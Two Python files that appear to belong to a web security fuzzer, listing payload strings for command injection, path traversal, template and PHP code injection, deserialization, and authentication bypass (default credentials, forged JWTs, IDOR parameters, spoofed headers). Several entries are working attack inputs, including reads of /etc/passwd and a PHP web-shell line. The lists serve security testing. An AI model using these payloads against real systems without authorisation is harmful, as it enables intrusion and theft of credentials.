"""
app/services/fuzzer/payloads/rce.py
─────────────────────────────────────
Remote Code / Command Execution payload library.
"""

RCE_PAYLOADS = [
    # Unix command injection
    "; whoami",
    "| whoami",
    "& whoami",
    "&& whoami",
    "$(whoami)",
    "`whoami`",
    "; id",
    "| id",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ls -la",
    "\n whoami",
    # Windows command injection
    "& ipconfig",
    "| dir",
    "; dir",
    "& net user",
    # Path traversal / LFI
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..\\..\\..\\windows\\win.ini",
    # Template injection (SSTI)
    "{{7*7}}",
    "${7*7}",
    "{{7*'7'}}",
    "<%= 7 * 7 %>",
    "#{7*7}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    # PHP code injection
    "<?php system('id'); ?>",
    "<?php echo shell_exec($_GET['cmd']); ?>",
    # Deserialization markers
    'O:8:"stdClass":0:{}',
    "rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc=",
]


"""
app/services/fuzzer/payloads/auth_bypass.py
─────────────────────────────────────────────
Authentication bypass and privilege escalation payloads.
"""

AUTH_BYPASS_PAYLOADS = [
    # Default credentials
    "admin",
    "admin:admin",
    "admin:password",
    "admin:123456",
    "root:root",
    "root:toor",
    "test:test",
    "guest:guest",
    # JWT manipulation
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    # Session fixation
    "PHPSESSID=injected_session_id",
    "sessionid=0000000000000000000000000000000",
    # IDOR
    "id=1",
    "id=0",
    "id=-1",
    "user_id=1",
    "user_id=admin",
    "role=admin",
    "isAdmin=true",
    "isAdmin=1",
    # Header manipulation
    "X-Original-URL: /admin",
    "X-Forwarded-For: 127.0.0.1",
    "X-Custom-IP-Authorization: 127.0.0.1",
]
